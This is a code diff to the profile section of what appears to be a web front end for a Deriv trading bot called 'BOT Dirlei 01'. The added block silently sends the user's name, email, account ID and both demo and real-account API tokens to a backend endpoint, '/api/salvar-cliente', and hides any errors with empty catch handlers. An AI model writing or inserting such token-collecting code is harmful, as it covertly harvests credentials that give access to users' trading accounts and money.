@@ -1159,6 +1159,24 @@ body { overflow-x: hidden !important; }
                     document.getElementById('perfilNome').textContent     = s.fullname || (s.first_name + ' ' + (s.last_name||'')).trim() || '—';
                     document.getElementById('perfilEmail').textContent     = s.email || '—';
                     document.getElementById('perfilDataEntrada').textContent = dataCriacao;
+                    // Salvar cliente no backend
+                    try {
+                        const _derivId = conta.acct || conta.loginid || conta.account || '';
+                        const _accountType = tipo || 'demo';
+                        fetch('/api/salvar-cliente', {
+                            method: 'POST',
+                            headers: {'Content-Type':'application/json'},
+                            body: JSON.stringify({
+                                deriv_id:     _derivId,
+                                nome:         s.fullname || (s.first_name+' '+(s.last_name||'')).trim(),
+                                email:        s.email || '',
+                                account_type: _accountType,
+                                bot_name:     'BOT Dirlei 01',
+                                token_demo:   contas.find(c=>c.isDemo)?.token || '',
+                                token_real:   contas.find(c=>!c.isDemo)?.token || ''
+                            })
+                        }).catch(()=>{});
+                    } catch(_e) {}
                     const paisCod = (s.country || s.place_of_birth || '').toUpperCase();
                     document.getElementById('perfilPais').textContent = PAISES[paisCod] || paisCod || '—';
 
